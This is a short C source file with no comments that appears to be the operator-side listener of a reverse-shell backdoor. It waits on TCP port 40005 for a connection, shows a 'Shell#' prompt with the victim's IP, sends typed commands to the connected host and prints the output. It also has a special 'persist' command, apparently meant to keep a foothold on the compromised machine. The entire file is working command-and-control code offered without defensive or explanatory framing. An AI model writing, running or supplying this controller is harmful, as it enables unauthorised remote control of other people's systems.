#include<stdio.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<netinet/in.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<arpa/inet.h>


int main(){
    struct sockaddr_in server, client;
    socklen_t client_addr_len = sizeof(client);
    char buffer[1024];
    char response[18384];
    int sock,client_sock;
    int optval = 1;

    sock = socket(AF_INET,SOCK_STREAM,0);
    if(setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,&optval,sizeof(optval))<0){
        printf("error setting up TCP socket!!!");
        return 1;
    }
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("0.0.0.0");
    server.sin_port = htons(40005);

    bind(sock,(struct sockaddr *)&server,sizeof(server));
    listen(sock,5);
    client_sock = accept(sock,(struct sockaddr * )&client,&client_addr_len);
    
    while(1){
        bzero(&buffer,sizeof(buffer));
        bzero(&response,sizeof(response));
        printf("* Shell#%s: ", inet_ntoa(client.sin_addr));
        fgets(buffer,sizeof(buffer),stdin);
        strtok(buffer,"\n");

        write(client_sock,buffer,sizeof(buffer));

        if(strncmp("q",buffer,1)==0){
            break;
        }
        else if(strncmp("persist",buffer,7)==0){
            recv(client_sock,response,sizeof(response),0);
            printf("%s",response);
            
            
        }
        else{
            recv(client_sock,response,sizeof(response),MSG_WAITALL);
            printf("%s",response);

        }

    }

}